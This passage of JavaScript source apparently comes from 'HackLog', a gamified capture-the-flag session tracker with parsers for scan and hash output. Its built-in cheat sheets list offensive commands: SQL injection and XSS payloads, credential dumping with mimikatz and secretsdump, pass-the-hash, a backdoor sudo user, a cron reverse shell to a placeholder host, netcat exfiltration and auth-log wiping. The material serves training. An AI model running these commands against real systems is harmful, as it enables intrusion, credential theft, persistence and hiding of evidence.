function delFinding(i){const t=getT();t.findings.splice(i,1);save();renderTab();renderSidebar();toast('Finding removed');}

/* ═══════════════ TARGET CRUD ═══════════════ */
function createTarget(){
  const ne=E('f-name');const name=ne.value.trim();
  if(!name){ne.classList.add('err');ne.focus();setTimeout(()=>ne.classList.remove('err'),400);return;}
  const t={
    id:'t'+Date.now(),name,ip:E('f-ip').value.trim(),os:E('f-os').value,
    difficulty:E('f-diff').value,platform:E('f-platform').value,
    type:E('f-type').value,
    desc:E('f-desc').value.trim(),completed:false,completedAt:null,
    pwnXpGranted:false,
    checks:{},checkNotes:{},typeChecks:{},notes:[],findings:[],
    timerStartedAt:Date.now(),timerAccumulated:0,timerRunning:true,
    sessionDate:new Date().toDateString(),
  };
  targets.push(t);save();closeModal('modalNew');
  ['f-name','f-ip','f-desc'].forEach(id=>{const el=E(id);if(el)el.value='';});
  showApp();renderSidebar();selectTarget(t.id);
  grantXP(25,'session started');checkAch();updateStreak();
  toast(`${t.name} — Session started!`);
}
function saveFinding(){
  const ve=E('fi-value');const val=ve.value.trim();
  if(!val){ve.classList.add('err');ve.focus();setTimeout(()=>ve.classList.remove('err'),400);return;}
  const t=getT();if(!t.findings)t.findings=[];
  const type=E('fi-type').value;
  const tv=E('fi-time').value.trim()||new Date().toTimeString().slice(0,5);
  t.findings.push({type,value:val,severity:E('fi-sev').value,ctx:E('fi-ctx').value.trim(),time:tv});
  save();closeModal('modalFinding');ve.value='';E('fi-ctx').value='';E('fi-time').value='';
  if(activeTab==='findings')renderTab();renderSidebar();
  const xpM={flag_user:100,flag_root:150,creds:50,hash:30,vuln:40,port:10,note:10};
  const lM={flag_user:'user flag captured!',flag_root:'root flag captured!',creds:'credentials found',hash:'hash acquired',vuln:'vulnerability logged',port:'port discovered',note:'finding logged'};
  grantXP(xpM[type]||10,lM[type]||'finding logged');checkAch();toast('Finding logged!');
}
function confDel(id){const t=targets.find(t=>t.id===id);if(!t)return;pendingDel=id;E('delName').textContent=t.name;openModal('modalDel');}
function execDelete(){
  if(!pendingDel)return;const name=targets.find(t=>t.id===pendingDel)?.name||'';
  targets=targets.filter(t=>t.id!==pendingDel);save();
  if(activeId===pendingDel){activeId=null;E('workspace').style.display='none';E('emptyState').style.display='flex';}
  pendingDel=null;closeModal('modalDel');renderSidebar();toast(`Deleted "${name}"`);
}

/* ═══════════════ ONBOARDING ══════════════ */
function showOnboard(){const el=E('onboardModal');el.style.display='flex';rAF(()=>rAF(()=>el.classList.add('open')));}
function finishOnboard(){
  const h=E('obHandle')?.value.trim();
  if(h){const pf=getProfile();pf.handle=h;pf.tagline='Ready to hack.';localStorage.setItem(K+'_pf',JSON.stringify(pf));}
  localStorage.setItem(K+'_joined',new Date().toISOString().slice(0,10));
  const el=E('onboardModal');el.classList.remove('open');el.addEventListener('transitionend',()=>{el.style.display='none'},{once:true});
  localStorage.setItem(K+'_ob','1');renderProfile();toast('Welcome to HackLog — happy hacking!');
}

/* ═══════════════ PARSERS ══════════════════ */
function parseNmap(raw){
  const lines=raw.split('\n').map(l=>l.trim()).filter(Boolean);const ports=[];
  for(const l of lines){const m=l.match(/^(\d+)\/(tcp|udp)\s+(open|filtered|closed)\s+(\S+)(?:\s+(.*))?$/);if(m)ports.push({port:m[1],proto:m[2],state:m[3],svc:m[4],ver:(m[5]||'').trim()});}
  if(!ports.length)return`<div style="color:var(--t3);font-size:13px;padding:8px">No port data found. Paste the PORT STATE SERVICE section from nmap output.</div>`;
  const open=ports.filter(p=>p.state==='open');
  const web=open.filter(p=>['80','443','8080','8443','8000','8888','3000'].includes(p.port));
  const ssh=open.filter(p=>p.svc.includes('ssh'));const smb=open.filter(p=>['139','445'].includes(p.port));
  const sugg=[];if(web.length)sugg.push(`Web on port${web.length>1?'s':''} ${web.map(p=>p.port).join(', ')} → try gobuster/ffuf`);if(ssh.length)sugg.push(`SSH on port ${ssh[0].port} → try hydra or default creds`);if(smb.length)sugg.push(`SMB detected → try enum4linux, crackmapexec`);
  const rows=ports.map(p=>`<tr><td class="pt-port">${esc(p.port)}/${esc(p.proto)}</td><td class="${p.state==='open'?'pt-open':''}">${esc(p.state)}</td><td>${esc(p.svc)}</td><td style="color:var(--t2);font-size:11px">${esc(p.ver)}</td></tr>`).join('');
  return`<div class="parse-result-card" style="margin-bottom:8px">
    <div class="parse-result-title" style="color:var(--green)">${IC.radio} ${open.length} open port${open.length!==1?'s':''} of ${ports.length} scanned</div>
    <table class="parse-table"><thead><tr><th>Port</th><th>State</th><th>Service</th><th>Version</th></tr></thead><tbody>${rows}</tbody></table>
  </div>
  ${sugg.length?`<div class="next-steps"><div class="next-steps-title">${IC.lightbulb} Suggested Next Steps</div><div class="next-steps-body">${sugg.map(s=>`→ ${s}`).join('<br>')}</div></div>`:''}`;
}
function parseEnum(raw){
  const lines=raw.split('\n').map(l=>l.trim()).filter(Boolean);const dirs=[];
  for(const l of lines){const m=l.match(/^\/?(\S+)\s+\(Status:\s*(\d+)\)(?:\s*\[Size:\s*(\d+)\])?/);if(m)dirs.push({path:'/'+m[1].replace(/^\//,''),status:m[2],size:m[3]||'—'});const m2=l.match(/^\[Status: (\d+),\s*Size: (\d+).*?\] \* FUZZ: (.+)$/);if(m2)dirs.push({path:'/'+m2[3],status:m2[1],size:m2[2]});}
  const ports=[];for(const l of lines){const m=l.match(/^(\d+)\/(tcp|udp)\s+(open)\s+(\S+)(?:\s+(.*))?$/);if(m)ports.push({port:m[1],proto:m[2],svc:m[4],ver:(m[5]||'').trim()});}
  let html='';
  const statusColor=(s)=>s==='200'?'var(--green)':s==='301'||s==='302'?'var(--cyan)':s==='403'?'var(--amber)':'var(--t3)';
  if(dirs.length){html+=`<div class="parse-result-card" style="margin-bottom:8px"><div class="parse-result-title">${IC.search} ${dirs.length} path${dirs.length!==1?'s':''} found</div><div style="padding:4px">`;html+=dirs.slice(0,40).map(d=>`<div style="display:flex;align-items:center;gap:8px;padding:4px 8px;border-radius:var(--r);font-family:var(--mono);font-size:12px;transition:background .08s" onmouseover="this.style.background='var(--surface2)'" onmouseout="this.style.background=''"><span style="color:${statusColor(d.status)};font-weight:700;width:32px;flex-shrink:0">${d.status}</span><span style="color:var(--t1);flex:1">${esc(d.path)}</span><span style="color:var(--t3);font-size:11px">${d.size}</span></div>`).join('');html+=`</div></div>`;}
  if(ports.length){const rows=ports.map(p=>`<tr><td class="pt-port">${esc(p.port)}/${esc(p.proto)}</td><td class="pt-open">open</td><td>${esc(p.svc)}</td><td style="color:var(--t2);font-size:11px">${esc(p.ver)}</td></tr>`).join('');html+=`<div class="parse-result-card"><div class="parse-result-title">${IC.radio} Open Ports</div><table class="parse-table"><thead><tr><th>Port</th><th>State</th><th>Service</th><th>Version</th></tr></thead><tbody>${rows}</tbody></table></div>`;}
  return html||`<div style="color:var(--t3);font-size:13px;padding:8px">No data found. Try pasting gobuster or nmap output.</div>`;
}
function parseExploit(raw){
  const lines=raw.split('\n').map(l=>l.trim()).filter(Boolean);const creds=[],flags=[],vulns=[];
  for(const l of lines){
    if(/(?:HTB|THM|FLAG|CTF)\{[^}]+\}/i.test(l)){flags.push(l.match(/(?:HTB|THM|FLAG|CTF)\{[^}]+\}/i)[0]);continue;}
    if(/^[a-zA-Z0-9._\-$@]+:[^\s:]{2,}$/.test(l)&&!l.startsWith('#')){creds.push(l);continue;}
    if(/CVE-\d{4}-\d+/.test(l))vulns.push({t:'CVE',v:l.match(/CVE-\d{4}-\d+/g).join(', ')});
  }
  let html='';
  if(flags.length)html+=`<div class="parse-result-card" style="margin-bottom:8px"><div class="parse-result-title" style="color:var(--amber)">${IC.flag} Flags Detected</div>${flags.map(f=>`<div class="cred-item"><span style="flex:1;color:var(--amber)">${esc(f)}</span><button class="cred-copy" onclick="navigator.clipboard.writeText('${esc(f)}');toast('Copied!')">Copy</button></div>`).join('')}</div>`;
  if(creds.length)html+=`<div class="parse-result-card" style="margin-bottom:8px"><div class="parse-result-title" style="color:var(--green)">${IC.key} Credentials Detected</div>${creds.map(c=>`<div class="cred-item"><span style="flex:1">${esc(c)}</span><button class="cred-copy" onclick="navigator.clipboard.writeText('${esc(c)}');toast('Copied!')">Copy</button></div>`).join('')}</div>`;
  if(vulns.length)html+=vulns.map(v=>`<div class="next-steps" style="margin-bottom:6px"><div class="next-steps-title">${IC.zap} ${esc(v.t)} Detected</div><div class="next-steps-body">${esc(v.v)}</div></div>`).join('');
  return html||`<div style="color:var(--t3);font-size:13px;padding:8px">No credentials, flags, or CVEs detected.</div>`;
}
function parsePrivesc(raw){
  const lines=raw.split('\n').map(l=>l.trim()).filter(Boolean);const sudo=[],suid=[],crons=[];
  const gtfob=['vim','find','python','python3','perl','ruby','bash','sh','nmap','less','more','awk','nano','cp','cat','wget','curl','node','php','env','tar','zip','nc','socat'];
  for(const l of lines){if(/NOPASSWD|sudo/.test(l)&&!/^#/.test(l))sudo.push(l);else if(/(-rwsr|-rwxr-s)/.test(l)){const m=l.match(/\S+$/);if(m)suid.push(m[0]);}else if(/^\*\s|\d+\s+\*\s+\*/.test(l)&&/root|bash|sh|python/.test(l))crons.push(l);}
  let html='';
  if(sudo.length){const g=sudo.flatMap(s=>gtfob.filter(g=>s.includes(g)));html+=`<div class="parse-result-card" style="margin-bottom:8px;border-color:rgba(251,191,36,.25)"><div class="parse-result-title" style="color:var(--amber)">${IC.key} Sudo Permissions</div><div style="padding:8px">${sudo.map(s=>`<div style="font-family:var(--mono);font-size:12px;color:var(--t2);padding:5px 8px;background:var(--amberbg);border-radius:var(--r);margin-bottom:4px">${esc(s)}</div>`).join('')}${g.length?`<div class="next-steps" style="margin-top:8px"><div class="next-steps-title">${IC.lightbulb} GTFOBins Matches: ${g.join(', ')}</div></div>`:''}</div></div>`;}
  if(suid.length){const g=suid.flatMap(s=>gtfob.filter(b=>s.includes(b)));html+=`<div class="parse-result-card" style="margin-bottom:8px;border-color:rgba(248,113,113,.25)"><div class="parse-result-title" style="color:var(--red)">${IC.zap} SUID Binaries</div><div style="padding:8px">${suid.map(s=>`<div style="font-family:var(--mono);font-size:12px;color:var(--t2);padding:5px 8px;background:var(--redbg);border-radius:var(--r);margin-bottom:4px">${esc(s)}</div>`).join('')}${g.length?`<div class="next-steps" style="margin-top:8px"><div class="next-steps-title">${IC.lightbulb} GTFOBins: ${g.join(', ')}</div></div>`:''}</div></div>`;}
  if(crons.length)html+=`<div class="parse-result-card"><div class="parse-result-title" style="color:var(--cyan)">${IC.search} Suspicious Cron Jobs</div><div style="padding:8px">${crons.map(c=>`<div style="font-family:var(--mono);font-size:12px;color:var(--t2);padding:5px 8px;background:var(--accentbg);border-radius:var(--r);margin-bottom:4px">${esc(c)}</div>`).join('')}</div></div>`;
  return html||`<div style="color:var(--t3);font-size:13px;padding:8px">No privilege escalation vectors detected.</div>`;
}
function parsePost(raw){
  const lines=raw.split('\n').map(l=>l.trim()).filter(Boolean);const hashes=[],flags=[];
  const hp=[{re:/^\$6\$[^\s]+/,t:'SHA-512 (Linux)',c:'hashcat -m 1800'},{re:/^\$5\$[^\s]+/,t:'SHA-256 (Linux)',c:'hashcat -m 7400'},{re:/^\$2[ayb]\$[^\s]+/,t:'bcrypt',c:'hashcat -m 3200'},{re:/^\$1\$[^\s]+/,t:'MD5-crypt',c:'hashcat -m 500'},{re:/aad3b435b51404ee/i,t:'NTLM',c:'hashcat -m 1000'},{re:/^[a-f0-9]{32}:[a-f0-9]{32}$/i,t:'LM:NT',c:'hashcat -m 1000'},{re:/^[a-f0-9]{32}$/i,t:'MD5',c:'hashcat -m 0'},{re:/^[a-f0-9]{40}$/i,t:'SHA-1',c:'hashcat -m 100'},{re:/^[a-f0-9]{64}$/i,t:'SHA-256',c:'hashcat -m 1400'}];
  for(const l of lines){if(/(?:HTB|THM|FLAG|CTF)\{[^}]+\}/i.test(l)){flags.push(l.match(/(?:HTB|THM|FLAG|CTF)\{[^}]+\}/i)[0]);continue;}const sm=l.match(/^(\w+):(\$\S+):/);if(sm){const h=hp.find(p=>p.re.test(sm[2]));hashes.push({u:sm[1],v:sm[2],t:h?.t||'Unknown',c:h?.c||'hashcat'});continue;}for(const p of hp){if(p.re.test(l)){hashes.push({u:'',v:l,t:p.t,c:p.c});break;}}}
  let html='';
  if(flags.length)html+=`<div class="parse-result-card" style="margin-bottom:8px"><div class="parse-result-title" style="color:var(--amber)">${IC.flag} Flags Detected</div>${flags.map(f=>`<div class="cred-item"><span style="flex:1;color:var(--amber)">${esc(f)}</span><button class="cred-copy" onclick="navigator.clipboard.writeText('${esc(f)}');toast('Copied!')">Copy</button></div>`).join('')}</div>`;
  if(hashes.length)html+=`<div class="parse-result-card"><div class="parse-result-title" style="color:var(--red)">${IC.hash} Hashes Detected</div><div style="padding:8px">${hashes.map(h=>`<div class="hash-item"><div class="hash-type">${esc(h.t)}${h.u?' — user: '+esc(h.u):''} · Crack with: ${esc(h.c)}</div><div class="hash-val"><span style="flex:1;word-break:break-all">${esc(h.v)}</span><button class="cred-copy" onclick="navigator.clipboard.writeText('${esc(h.v)}');toast('Copied!')">Copy</button></div></div>`).join('')}</div></div>`;
  return html||`<div style="color:var(--t3);font-size:13px;padding:8px">No hashes or flags detected. Paste /etc/shadow or hash dumps.</div>`;
}

/* ═══════════════ TOAST ══════════════════ */
function toast(msg,dur=2400){const el=E('toast');el.textContent=msg;el.classList.add('show');clearTimeout(el._t);el._t=setTimeout(()=>el.classList.remove('show'),dur);}

/* ═══════════════ KEYBOARD ═══════════════ */
document.addEventListener('keydown',e=>{
  if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA'||e.target.tagName==='SELECT')return;
  const tabs=['overview','checklist','commands','notes','findings'];
  if(e.key>='1'&&e.key<='5'&&activeId){const i=parseInt(e.key)-1;const b=document.querySelectorAll('.tab-btn')[i];if(b)switchTab(tabs[i],b);e.preventDefault();}
  if(e.key==='n'&&!e.metaKey&&!e.ctrlKey&&activeId){if(activeTab==='notes'){newNote();e.preventDefault();}else if(activeTab==='findings'){openModal('modalFinding');e.preventDefault();}}
  if(e.key==='c'&&!e.metaKey&&!e.ctrlKey&&activeId&&activeTab==='overview'){toggleComplete();e.preventDefault();}
  if(e.key==='p'&&!e.metaKey&&!e.ctrlKey){goProfile();e.preventDefault();}
  if(e.key==='Escape'){document.querySelectorAll('.modal-bg.open').forEach(m=>{m.classList.remove('open');});const ab=E('achModal');if(ab.classList.contains('open'))closeAch();}
});

/* ═══════════════ PROFILE IMAGE ═══════════ */
function handleAvatarUpload(input){
  const file=input.files[0];if(!file)return;
  if(file.size>500000){toast('Image too large. Please use an image under 500KB.');return}
  const reader=new FileReader();
  reader.onload=function(e){
    const pf=getProfile();pf.avatarUrl=e.target.result;
    localStorage.setItem(K+'_pf',JSON.stringify(pf));
    renderProfile();toast('Profile image updated!');
  };
  reader.readAsDataURL(file);
}
function renderAvatar(){
  const pf=getProfile();const av=E('profileAvatar');if(!av)return;
  const handle=pf.handle||'Hacker';
  if(pf.avatarUrl){
    av.innerHTML=`<img class="avatar-img" src="${pf.avatarUrl}" alt="avatar"><div class="online-dot"></div>`;
  } else {
    av.innerHTML=`${handle.slice(0,2).toUpperCase()}<div class="online-dot"></div>`;
  }
}

/* ═══════════════ WEEKLY PROGRESS ═════════ */
function buildWeeklyProgress(){
  const grid=E('weeklyGrid');if(!grid)return;
  const hm={};try{Object.assign(hm,JSON.parse(localStorage.getItem(K+'_hm')||'{}'))}catch{}
  const today=new Date();const dow=today.getDay();
  // This week: Sunday to today
  const thisWeekStart=new Date(today);thisWeekStart.setDate(today.getDate()-dow);
  const lastWeekStart=new Date(thisWeekStart);lastWeekStart.setDate(lastWeekStart.getDate()-7);

  let thisWeekMins=0,lastWeekMins=0,thisWeekDays=0,lastWeekDays=0;
  for(let i=0;i<7;i++){
    const d1=new Date(thisWeekStart);d1.setDate(d1.getDate()+i);
    const k1=d1.toISOString().slice(0,10);
    if(hm[k1]){thisWeekMins+=hm[k1];thisWeekDays++;}
    const d2=new Date(lastWeekStart);d2.setDate(d2.getDate()+i);
    const k2=d2.toISOString().slice(0,10);
    if(hm[k2]){lastWeekMins+=hm[k2];lastWeekDays++;}
  }

  // Count sessions and flags this week
  const thisWeekSessions=targets.filter(t=>{
    const sd=t.sessionDate?new Date(t.sessionDate):null;
    return sd&&sd>=thisWeekStart&&sd<=today;
  }).length;
  const lastWeekSessions=targets.filter(t=>{
    const sd=t.sessionDate?new Date(t.sessionDate):null;
    return sd&&sd>=lastWeekStart&&sd<thisWeekStart;
  }).length;

  const delta=(cur,prev)=>{
    if(prev===0&&cur===0)return{cls:'flat',txt:'—'};
    if(prev===0)return{cls:'up',txt:'+'+cur};
    const pct=Math.round((cur-prev)/prev*100);
    if(pct>0)return{cls:'up',txt:'+'+pct+'%'};
    if(pct<0)return{cls:'down',txt:pct+'%'};
    return{cls:'flat',txt:'No change'};
  };

  const dTime=delta(thisWeekMins,lastWeekMins);
  const dDays=delta(thisWeekDays,lastWeekDays);
  const dSess=delta(thisWeekSessions,lastWeekSessions);

  const fmtMins=m=>{const h=Math.floor(m/60);return h>0?`${h}h ${m%60}m`:`${m}m`};

  grid.innerHTML=`
    <div class="weekly-item">
      <div class="weekly-val">${fmtMins(thisWeekMins)}</div>
      <div class="weekly-label">Hacking Time</div>
      <div class="weekly-delta ${dTime.cls}">${dTime.txt} vs last week</div>
    </div>
    <div class="weekly-item">
      <div class="weekly-val">${thisWeekDays}</div>
      <div class="weekly-label">Active Days</div>
      <div class="weekly-delta ${dDays.cls}">${dDays.txt} vs last week</div>
    </div>
    <div class="weekly-item">
      <div class="weekly-val">${thisWeekSessions}</div>
      <div class="weekly-label">Sessions Started</div>
      <div class="weekly-delta ${dSess.cls}">${dSess.txt} vs last week</div>
    </div>`;
}

/* ═══════════════ ACTIVITY GRAPH ═══════════ */
function buildActivityGraph(){
  const el=E('activityGraph');if(!el)return;
  const hm={};try{Object.assign(hm,JSON.parse(localStorage.getItem(K+'_hm')||'{}'))}catch{}
  const days=[];const today=new Date();
  const DAYNAMES=['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
  const MO=['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
  for(let i=13;i>=0;i--){
    const d=new Date(today);d.setDate(d.getDate()-i);
    const k=d.toISOString().slice(0,10);
    days.push({k,v:hm[k]||0,label:`${MO[d.getMonth()]} ${d.getDate()}`,day:DAYNAMES[d.getDay()]});
  }
  const max=Math.max(1,...days.map(d=>d.v));
  el.innerHTML=days.map(d=>{
    const h=Math.max(2,Math.round(d.v/max*100));
    return`<div class="graph-bar-col">
      <div class="graph-bar" style="height:${h}%"><div class="graph-bar-val">${d.v}m</div></div>
      <div class="graph-bar-label">${d.day.charAt(0)}</div>
    </div>`;
  }).join('');
}

function buildSkillGrid(){
  const el=E('skillGrid');if(!el)return;
  const colors={recon:'var(--accent)',enum:'var(--green)',exploit:'var(--red)',privesc:'var(--amber)',post:'var(--purple)'};
  el.innerHTML=PHASES.map(ph=>{
    const total=ph.items.length;
    const done=targets.reduce((s,t)=>s+ph.items.filter(it=>(t.checks||{})[it.id]).length,0);
    const maxPossible=total*Math.max(1,targets.length);
    const pct=Math.round(done/maxPossible*100);
    const circ=2*Math.PI*18;
    const offset=circ*(1-pct/100);
    return`<div class="skill-item">
      <div class="skill-ring">
        <svg viewBox="0 0 48 48">
          <circle class="skill-ring-track" cx="24" cy="24" r="18"/>
          <circle class="skill-ring-fill" cx="24" cy="24" r="18" stroke="${colors[ph.id]||'var(--accent)'}" stroke-dasharray="${circ}" stroke-dashoffset="${offset}"/>
        </svg>
        <div class="skill-ring-num">${pct}%</div>
      </div>
      <div class="skill-name">${ph.name.split(' ')[0]}</div>
    </div>`;
  }).join('');
}

/* ═══════════════ PHASE COMPLETE BUTTONS ═══ */
function togglePhaseComplete(phId){
  const t=getT();if(!t)return;
  if(!t.phaseCompleted)t.phaseCompleted={};
  t.phaseCompleted[phId]=!t.phaseCompleted[phId];
  if(t.phaseCompleted[phId]){
    // Mark all items in phase as done
    if(!t.checks)t.checks={};
    const ph=PHASES.find(p=>p.id===phId);
    if(ph)ph.items.forEach(it=>{if(!t.checks[it.id]){t.checks[it.id]=true;grantXP(5)}});
    toast(`${ph?.name||'Phase'} completed!`);
  }
  save();renderTab();renderSidebar();
}

function getPhaseCompletionPct(t){
  const completed=PHASES.filter(ph=>(t.phaseCompleted||{})[ph.id]).length;
  return Math.round(completed/PHASES.length*100);
}

/* ═══════════════ STUDY TAB ════════════════ */
const BLOG_CATEGORIES={
  web:{name:'Web Security',color:'var(--amber)',bg:'var(--amberbg)'},
  crypto:{name:'Cryptography',color:'var(--cyan)',bg:'rgba(103,232,249,.1)'},
  forensics:{name:'Forensics',color:'var(--purple)',bg:'var(--purplebg)'},
  osint:{name:'OSINT',color:'var(--green)',bg:'var(--greenbg)'},
  networking:{name:'Networking',color:'var(--accent)',bg:'var(--accentbg)'},
  tools:{name:'Tools & Techniques',color:'var(--red)',bg:'var(--redbg)'},
  general:{name:'General',color:'var(--t2)',bg:'var(--surface2)'},
};

const SHEET_CATEGORIES={
  web:{name:'Web',color:'#fbbf24'},
  network:{name:'Network',color:'#5b8def'},
  crypto:{name:'Crypto',color:'#67e8f9'},
  forensics:{name:'Forensics',color:'#a78bfa'},
  osint:{name:'OSINT',color:'#34d399'},
  tools:{name:'Tools',color:'#f87171'},
  general:{name:'General',color:'#8b95a8'},
};

const DEFAULT_SHEETS=[
  {id:'ds1',title:'nmap Cheat Sheet',cat:'network',content:`[QUICK RECON]
nmap -sV -sC --top-ports 1000 -T4 <IP>               # Fast top-1000 with service detection
nmap -p- --min-rate 5000 -T4 <IP> -oN allports.txt   # All 65535 ports (background scan)
nmap -sV -sC -p <PORTS> <IP> -oN detailed.txt        # Deep scan on found ports

[UDP]
nmap -sU --top-ports 100 -T4 <IP>                    # Top 100 UDP (DNS 53, SNMP 161, NTP 123)
nmap -sU -p 161 --script snmp-info <IP>              # SNMP enumeration

[SCRIPTS]
nmap --script vuln -p <PORTS> <IP>                   # Known CVE checks
nmap --script smb-enum-shares,smb-enum-users -p 445 <IP>
nmap --script http-enum -p 80,443,8080 <IP>          # Web directory enum
nmap --script ftp-anon -p 21 <IP>                    # FTP anonymous login check

[OUTPUT FORMATS]
nmap ... -oN scan.txt      # Normal (human-readable)
nmap ... -oX scan.xml      # XML (for import into tools)
nmap ... -oG scan.gnmap    # Grepable
nmap ... -oA scan_output   # All three at once

[TIPS]
# Always run quick scan first, full scan in background
nmap --top-ports 1000 -T4 <IP> & nmap -p- --min-rate 3000 <IP> -oN full.txt &`,createdAt:Date.now()},
  {id:'ds2',title:'Web Enumeration',cat:'web',content:`[DIRECTORY BRUTE-FORCE]
gobuster dir -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak -t 50 -o gobuster.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt:FUZZ -u http://<IP>/FUZZ -fc 404,403 -o ffuf.json
dirsearch -u http://<IP> -e php,html,txt,bak -t 40 --plain-text-report=dirsearch.txt

[VHOST / SUBDOMAIN FUZZING]
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -H "Host: FUZZ.<domain>" -u http://<IP> -fc 302,404
gobuster vhost -u http://<domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

[TECH FINGERPRINTING]
whatweb http://<IP> -v                               # CMS, frameworks, versions
nikto -h http://<IP>                                 # Vulnerability scanner
curl -I http://<IP>                                  # Response headers (Server, X-Powered-By)
wappalyzer / builtwith.com                           # Browser plugin fingerprint

[USEFUL PATHS TO CHECK]
/robots.txt          /sitemap.xml        /.htaccess
/backup/             /admin/             /.git/
/wp-admin/           /phpmyadmin/        /.env
/config.php          /login              /api/
/console             /.DS_Store          /web.config

[SQL INJECTION — QUICK TEST]
' OR '1'='1                                          # Classic SQLi test
' OR 1=1--                                           # MySQL comment
'; DROP TABLE--                                      # SQLi detection
sqlmap -u "http://<IP>/page?id=1" --batch --dbs      # Automated SQLi

[XSS QUICK PAYLOADS]
<script>alert(1)</script>
"><img src=x onerror=alert(1)>
javascript:alert(document.cookie)`,createdAt:Date.now()},
  {id:'ds3',title:'Linux Privilege Escalation',cat:'tools',content:`[FIRST COMMANDS ON SHELL]
id && whoami && hostname && uname -a
cat /etc/os-release && cat /proc/version
cat /etc/passwd | grep -v nologin              # List users with shells
sudo -l                                         # What can you run as root?
env                                             # Environment variables (credentials?)

[SUID / SGID BINARIES]
find / -perm -4000 2>/dev/null                  # SUID — run as file owner
find / -perm -2000 2>/dev/null                  # SGID
# Check results at: https://gtfobins.github.io

[CRON JOBS]
crontab -l                                      # Current user cron
cat /etc/crontab                                # System cron
ls -la /etc/cron*
# Use pspy64 to monitor scheduled tasks in real-time

[OPEN PORTS / SERVICES]
ss -tnlp                                        # TCP listening (find internal services)
netstat -tulpn 2>/dev/null                      # Alternative
# Port-forward internal services: ssh -L 8080:127.0.0.1:80 user@<IP>

[PATH HIJACK]
echo $PATH
find / -writable -type d 2>/dev/null            # Writable directories
# If root runs /usr/local/bin/script → create malicious binary in a writable PATH dir

[CREDENTIAL HUNTING]
cat ~/.bash_history
find / -name "*.conf" 2>/dev/null | xargs grep -li "password" 2>/dev/null
grep -r "password\|passwd\|secret\|key=" /var/www/ 2>/dev/null
find / -name "*.txt" -readable 2>/dev/null | xargs grep -li "password" 2>/dev/null
cat /etc/shadow 2>/dev/null                     # If readable — jackpot

[AUTOMATED TOOLS]
# Upload and run from: python3 -m http.server 80
wget http://<LHOST>/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh | tee linpeas.out
wget http://<LHOST>/pspy64 && chmod +x pspy64 && ./pspy64

[KERNEL EXPLOITS]
uname -r                                        # Get kernel version
./linux-exploit-suggester.sh                    # Check against known CVEs`,createdAt:Date.now()},
  {id:'ds4',title:'Common CTF Crypto',cat:'crypto',content:`[IDENTIFY HASH TYPE]
hashid '<hash>'                                  # Detect hash algorithm
hash-identifier '<hash>'                         # Alternative
# MD5 = 32 hex chars | SHA1 = 40 | SHA256 = 64 | bcrypt = $2a$

[CRACK HASHES]
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt    # MD5
hashcat -m 100 hash.txt rockyou.txt                        # SHA1
hashcat -m 1800 hash.txt rockyou.txt                       # sha512crypt ($6$)
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  # John the Ripper

[BASE ENCODINGS]
echo '<b64>' | base64 -d                         # Base64 decode
echo '<hex>' | xxd -r -p                         # Hex decode
python3 -c "print(bytes.fromhex('<hex>').decode())"
python3 -c "import base64; print(base64.b32decode('<b32>'))"
python3 -c "import base64; print(base64.b85decode('<b85>'))"

[CLASSICAL CIPHERS]
echo "TEXT" | tr 'A-Za-z' 'N-ZA-Mn-za-m'       # ROT13
# Caesar brute-force:
python3 -c "
t='ENCODED'
for i in range(26):
    print(i,''.join(chr((ord(c)-65+i)%26+65) if c.isalpha() else c for c in t))"

[XOR OPERATIONS]
python3 -c "
a=b'ciphertext'
key=b'key'
print(bytes(a[i]^key[i%len(key)] for i in range(len(a))))"

[RSA WEAK KEY CHECKS]
# Small n → factor at factordb.com
# Low e (e=3) + small m → cube root attack
# Use RsaCtfTool: python3 RsaCtfTool.py --publickey pub.pem --private

[TOOLS]
CyberChef (Magic mode):  https://gchq.github.io/CyberChef/
dcode.fr (cipher ID):    https://www.dcode.fr/cipher-identifier
factordb.com (factor n): http://factordb.com`,createdAt:Date.now()},
  {id:'ds5',title:'Post-Exploitation',cat:'tools',content:`[CAPTURE FLAGS]
cat /home/*/user.txt 2>/dev/null                 # User flag
cat /root/root.txt 2>/dev/null                   # Root flag
find / -name "*.txt" -readable 2>/dev/null | xargs grep -l "flag{" 2>/dev/null

[DUMP CREDENTIALS]
# Linux
cat /etc/shadow                                  # Password hashes (needs root)
unshadow /etc/passwd /etc/shadow > hashes.txt   # Prepare for cracking
# Windows
secretsdump.py -just-dc-user Administrator domain/user:pass@<DC_IP>
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL

[CRACK DUMPED HASHES]
hashcat -m 1800 hashes.txt rockyou.txt          # Linux sha512crypt
hashcat -m 1000 hashes.txt rockyou.txt          # NTLM (Windows)
hashcat -m 500  hashes.txt rockyou.txt          # MD5crypt

[LATERAL MOVEMENT]
# Pass-the-Hash (PTH)
crackmapexec smb <IP> -u admin -H <NTLM_HASH>
psexec.py domain/user@<IP> -hashes :<NTLM>
# WinRM
evil-winrm -i <IP> -u <user> -p <pass>
evil-winrm -i <IP> -u <user> -H <NTLM_HASH>
# SSH key abuse
ssh-keygen -t rsa && cat ~/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys

[PERSISTENCE]
# Linux — Add backdoor user
useradd -m -s /bin/bash backdoor && echo 'backdoor:Password123' | chpasswd
echo 'backdoor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
# Linux — Cron reverse shell
echo '* * * * * root bash -c "bash -i >& /dev/tcp/<IP>/4444 0>&1"' >> /etc/crontab
# Windows — Registry autorun
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d "C:\\shell.exe"

[DATA EXFILTRATION]
# Transfer files out
scp user@<IP>:/path/to/file ./local/
python3 -m http.server 80           # Victim serves, attacker downloads
curl http://<LHOST>/file -o file    # Attacker serves, victim fetches
nc -lvnp 4444 > loot.zip && cat loot.zip | nc <LHOST> 4444

[COVERING TRACKS]
# Clear logs
echo "" > /var/log/auth.log
